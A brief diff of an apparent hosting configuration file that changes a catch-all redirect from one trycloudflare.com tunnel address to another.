@@ -4,7 +4,7 @@
   "redirects": [
     {
       "source": "/(.*)",
-      "destination": "https://charger-diesel-impacts-chem.trycloudflare.com/$1",
+      "destination": "https://legislature-kansas-kitchen-bodies.trycloudflare.com/$1",
       "permanent": false
     }
   ]
